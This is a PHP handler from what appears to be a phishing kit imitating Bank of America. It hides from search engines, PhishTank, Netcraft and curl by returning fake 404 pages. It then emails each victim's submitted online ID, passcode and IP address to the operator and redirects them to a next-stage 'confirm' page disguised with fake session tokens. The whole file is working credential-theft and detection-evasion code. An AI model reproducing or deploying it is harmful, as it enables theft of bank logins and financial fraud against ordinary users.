<?php

/***
 *      _____         _    _     __   __
 *     |  __ \       | |  | |    \ \ / /
 *     | |  | |_ __  | |__| | ___ \ V / 
 *     | |  | | '__| |  __  |/ _ \ > <  
 *     | |__| | |    | |  | |  __// . \ 
 *     |_____/|_|    |_|  |_|\___/_/ \_\
 *                                        
 *                                      
 */
 error_reporting(0);
  include ('config.php');
  	require '../prevents/anti1.php';
	require '../prevents/anti2.php';
	require '../prevents/anti3.php';
	require '../prevents/anti4.php';
	require '../prevents/anti5.php';
	require '../prevents/anti6.php';
	require '../prevents/anti7.php';
	require '../prevents/anti8.php';
include('get_browser.php');
$ip = $_SERVER['REMOTE_ADDR'];
//----------------------------------------------------------------------------------------------------------------//
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'orange',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		'phishtank',
		'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 404 Not Found'); 
    echo "HTTP/1.0 404 Not Found";
    exit();
}
$message .= "+################# S X V X M ################+\n";
$message .= "+############################################+\n";
$message .= "Online ID            : ".$_POST['formtext1']."\n";
$message .= "PassCode            :  ".$_POST['formtext2']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "+############### S X V X M ##############+\n";
$subject = "BOA LOG LOADING 50% : $ip"; 
$headers = "From: SXVXM<customer@xblack.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);

mail($send,$subject,$message,$headers);

$praga=rand();
$praga=md5($praga);
header("Location: confirm.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

	 
?>